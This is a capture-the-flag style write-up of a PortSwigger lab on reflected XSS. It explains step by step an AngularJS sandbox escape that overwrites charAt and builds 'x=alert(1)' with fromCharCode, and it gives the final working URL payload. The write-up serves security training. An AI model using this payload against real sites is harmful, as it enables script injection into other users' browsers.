# XSS - Reflected XSS with AngularJS

## 📌 Lab Details
- **Title**: Reflected XSS with AngularJS sandbox escape without strings
- **Difficulty**: Expert
- **Category**: Cross-site Scripting
- **Lab URL**: https://portswigger.net/academy/labs/launch/d82e3a0ca07b096a36c320bdaf6f10ac92869a49f98d1adfd16b4ffdc05390f1?referrer=%2fweb-security%2fcross-site-scripting%2fcontexts%2fclient-side-template-injection%2flab-angular-sandbox-escape-without-strings

## 🔍 Summary
This lab contains a **reflected XSS** vulnerability where `eval` function cannot be used to insert string into **Angular JS**.

## 🛠 Payload
1. `toString().constructor`
   - `toString()` gives you a string.
   - `.constructor` gives you the **String constructor**.
     
2. ` .prototype.charAt=[].join`
   - Normally, Angular uses `charAt` during string access checks in sandboxing.
   - Overwriting `charAt` breaks the sandbox because Angular uses it internally for security parsing.
   - `[].join` is a safe method that doesn't throw errors, so it's often used to stub functions.
  
3. `[1] | orderBy: ...`
   - This uses AngularJS' filter system. `orderBy` can evaluate arbitary code in sandboxed Angular if we break it correctly.
   - `[1]` is just a dummy array to trigger the filter.
  
4. `toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)`
   - This builds the string: "x=alert(1)".
  
5. Final Payload:
   ```sh
   ?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
   ```

## 📖 Key Takeaways
- AngularJS can be exploited even when strings and `$eval` are blocked.
- Bypasses use prototype pollution (`charAt`) and string building (`fromCharCode`).
  

## 🖼️ Screenshot 
![image](https://github.com/user-attachments/assets/dcdb95ae-3762-43ed-bde2-61c5552159a9)
![image](https://github.com/user-attachments/assets/e9e73c1d-84c8-47c1-9859-4621714a6b53)
![image](https://github.com/user-attachments/assets/3bc2f854-42b5-4596-b2a6-ecbf3cbfed68)
